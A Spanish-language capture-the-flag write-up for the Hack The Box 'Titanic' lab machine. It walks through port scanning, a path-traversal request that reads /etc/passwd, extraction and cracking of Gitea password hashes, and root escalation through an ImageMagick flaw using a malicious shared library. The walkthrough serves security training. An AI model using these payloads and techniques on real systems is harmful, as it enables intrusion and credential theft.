---
title: Titanic
layout: page
permalink: /HTB_Titanic
---

<h2 class="amarillo">Titanic</h2>
<div id="logos" style="text-align: center;">
  <img src="/assets/images/HTB/Titanic/Titanic.png" alt="under" oncontextmenu="return false;">
</div>

Comenzamos encendiendo la máquina Titanic y lanzando ping para saber si esta activa a la ip 10.129.86.168:

```bash
❯ ping -c 5 10.129.86.168
PING 10.129.86.168 (10.129.86.168) 56(84) bytes of data.
64 bytes from 10.129.86.168: icmp_seq=1 ttl=63 time=112 ms
64 bytes from 10.129.86.168: icmp_seq=2 ttl=63 time=109 ms
64 bytes from 10.129.86.168: icmp_seq=3 ttl=63 time=107 ms
64 bytes from 10.129.86.168: icmp_seq=4 ttl=63 time=108 ms
64 bytes from 10.129.86.168: icmp_seq=5 ttl=63 time=108 ms

--- 10.129.86.168 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4004ms
rtt min/avg/max/mdev = 107.328/108.932/111.847/1.566 ms
```

Vemos que la máquina devuelve un TTL de 63 por tanto, estamos frente a una máquina Linux.

<h1 class="amarillo">Enumeración</h1>

Vamos a lanzar un escaneo rápido y sigiloso con nmap para enumerar todo el rango de puertos en busca de aquellos abiertos:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.86.168 -oG allPorts
```
<div style="text-align: center;">
  <img src="/assets/images/HTB/Titanic/nmap.png" alt="under" oncontextmenu="return false;">
</div>

<div style="text-align: center;">
  <img src="/assets/images/HTB/Titanic/extractPorts.png" alt="under" oncontextmenu="return false;">
</div>

Vemos únicamente puerto 22 y 80 abiertos, vamos a lanzar otro escaneo con nmap pero esta vez para identificar la version y servicio que corren para estos dos puertos:

```bash
nmap -p22,80 -sCV 10.129.86.168 -oN targeted
```
<div style="text-align: center;">
  <img src="/assets/images/HTB/Titanic/nmap2.png" alt="under" oncontextmenu="return false;">
</div>

Vemos un dominio `titanic.htb` que nos puede servir para agregar al /etc/hosts en caso de que no podamos resolver la web.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Titanic/hosts.png" alt="under" oncontextmenu="return false;">
</div>

<h1 class="amarillo">Explotación</h1>

Podremos comenzar con un escaneo por consola de la web usando **whatweb**:
<div style="text-align: center;">
  <img src="/assets/images/HTB/Titanic/whatweb.png" alt="under" oncontextmenu="return false;">
</div>

Vemos que aplica un redirect al dominio y un Werkzeug 3.0.3 con Python.

Seguiremos enumerando un poco pero ahora con gobuster:
<div style="text-align: center;">
  <img src="/assets/images/HTB/Titanic/dirbust.png" alt="under" oncontextmenu="return false;">
</div>

Y vemos unos directorios que llaman la atención `/download /book /server-status`, probamos a mirar también por subdominos:
<div style="text-align: center;">
  <img src="/assets/images/HTB/Titanic/vhost.png" alt="under" oncontextmenu="return false;">
</div>

Y encontramos uno **dev.titanic.htb** el cual debemos agregar al /etc/hosts.

Por ahora no queda más que explorar la web:
<div style="text-align: center;">
  <img src="/assets/images/HTB/Titanic/web.png" alt="under" oncontextmenu="return false;">
</div>

Si ordenamos un Book para el crucero vemos por URL la variable ticket la cual nos puede permitir apuntar a otro archivo como el `/etc/passwd`:

```d
GET /download?ticket=c7a10956-ca61-4607-9ea0-d5cab200cbb7.json HTTP/1.1 -> Cambiar a ticket=../../../../../../../../../etc/passwd
Host: titanic.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://titanic.htb/
Connection: keep-alive
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
Priority: u=0
....
```
<div style="text-align: center;">
  <img src="/assets/images/HTB/Titanic/LFI.png" alt="under" oncontextmenu="return false;">
</div>

Lo ha hecho, por tanto tenemos un LFI para poder ejecutar comandos, pero no podemos hacer nada más que listar archivos.

Aquí procedemos a mirar entonces el subdominio que encontramos:
<div style="text-align: center;">
  <img src="/assets/images/HTB/Titanic/vhost1.png" alt="under" oncontextmenu="return false;">
</div>

Vemos un Gitea completamente funcional y podremos iniciar sesión, buscando un poquito no encontraremos vulnerabilidades asociadas a esta versión de gitea.

Y revisando un poco los usuarios que encontramos en la web vemos uno interesante con un repositorio algo especial y que llama bastante la atención:
<div style="text-align: center;">
  <img src="/assets/images/HTB/Titanic/gitea.png" alt="under" oncontextmenu="return false;">
</div>

Vemos unos puertos que se abren en un archivo docker a los cuales nosotros no tenemos acceso suponiendo que estamos tratando con un contenedor (Eso explicaría el porque no pudimos hacer nada con el LFI), pero vemos un usuario potencial llamado 'developer'. 

Si nos leemos la [documentación de GITEA](https://docs.gitea.com/installation/install-with-docker) sobre la configuración Docker como developer, desde la parte de **Help** en la página, podemos ver que el archivo de configuración se guarda bajo una ruta /data/gitea/gitea.db bajo usuario root después de hacer un curl a la ruta donde lo aloja el usuario developer.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Titanic/gitea2.png" alt="under" oncontextmenu="return false;">
</div>

Enumeramos un poco:
<div style="text-align: center;">
  <img src="/assets/images/HTB/Titanic/hash_posible.png" alt="under" oncontextmenu="return false;">
</div>

Usando sqlite3 podremos hacer uso de esta base de datos, y con una query podremos recuperar información después de haber enumerado toda la base de datos (Databases, Tables, Columns):

```sql
select lower_name, passwd, salt from user;
```
<div style="text-align: center;">
  <img src="/assets/images/HTB/Titanic/hashes.png" alt="under" oncontextmenu="return false;">
</div>

Vemos unos hashes que contemplan al usuario administrator, developer y nuestro propio usuario que usamos para registrarnos en gitea.

```sql
administrator|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|2d149e5fbd1b20cf31db3e3c6a28fc9b
developer|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|8bf3e3452b78544f8bee9400d6936d34
liandd|b2620fddacd2a4c286814df75ce745c645be5ba2c0784039a68ebeb524e43701b2eb875fe0669e33921e8c8c379789aa9769|123b9de51ff4e6ff3e273d8510489bc6
```
<div style="text-align: center;">
  <img src="/assets/images/HTB/Titanic/hash_posible.png" alt="under" oncontextmenu="return false;">
</div>

Buscando en internet como romper este hash existe un repo con una utilidad que nos puede ser de mucha ayuda `gitea2hashcat` el cual solo pide que le pasemos la base de datos:
<div style="text-align: center;">
  <img src="/assets/images/HTB/Titanic/gitea3.png" alt="under" oncontextmenu="return false;">
</div>

Obtendremos lo siguiente ejecutando el script:

```
developer
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```

Se lo pasamos a hashcat:
<div style="text-align: center;">
  <img src="/assets/images/HTB/Titanic/hashcat.png" alt="under" oncontextmenu="return false;">
</div>

Y daremos con las credenciales developer:25282528
<div style="text-align: center;">
  <img src="/assets/images/HTB/Titanic/developer.png" alt="under" oncontextmenu="return false;">
</div>

<h1 class="amarillo">Escalada</h1>

Una vez como el usuario developer probamos a listar si tenemos algún privilegio sobre los binarios del sistema con `sudo -l`, privilegios SUID, pero no vemos nada.

Curioseando por el sistema me encuentro que opt tiene unos directorios que no son propios del sistema:
<div style="text-align: center;">
  <img src="/assets/images/HTB/Titanic/escalada.png" alt="under" oncontextmenu="return false;">
</div>

Y vemos un script `identify_images.sh`.
#imagemagick
<div style="text-align: center;">
  <img src="/assets/images/HTB/Titanic/escalada2.png" alt="under" oncontextmenu="return false;">
</div>

Aquí es donde vemos nuestra potencial vía de escalar privilegios porque es una version vulnerable de magick la que usa el script que hemos encontrado. Buscando en internet daremos con un repositorio de github:

<a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8"> Vulnerabilidad y POC ImageMagick</a>

Se nos explica como acontecer con la explotación, se nos dice de crear el archivo:

```bash
cat << EOF > ./delegates.xml
<delegatemap><delegate xmlns="" decode="XML" command="id"/></delegatemap>
EOF
```

y luego comprobar que si este en uso la ejecución del comando `id`:

```bash
$ ls -al
drwxr-xr-x 2 user user 4096 Jul 20 03:31 .
drwxrwxrwt 1 user user 4096 Jul 20 11:52 ..
-rw-r--r-- 1 user user   74 Jul 20 11:52 delegates.xml
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ magick ./delegates.xml ./out.png 2>/dev/null
uid=1000(user) gid=1000(user) groups=1000(user)
```

Pero todo esto es como prueba de concepto POC, ya que nosotros lo haremos de otra forma:

Explotando la `LD_LIBRARY_PATH` 

1. Install the `AppImage` version `ImageMagick` and its dependencies:

```bash
/usr/bin/magick
$ magick --version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5)
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)
```

2. Creamos una librería compartida que utiliza magick en el directorio actual de trabajo (Esto hace que el binario no busque en /lib) así carga directamente de nuestro directorio la librería maliciosa.

```c
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cat /root/root.txt > /tmp/root.txt");
    exit(0);
}
EOF
```

3. Ya solo queda ejecutar magick
<div style="text-align: center;">
  <img src="/assets/images/HTB/Titanic/escalada4.png" alt="under" oncontextmenu="return false;">
</div>

Y habremos completado la máquina.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Titanic/pwn.png" alt="under" oncontextmenu="return false;">
</div>

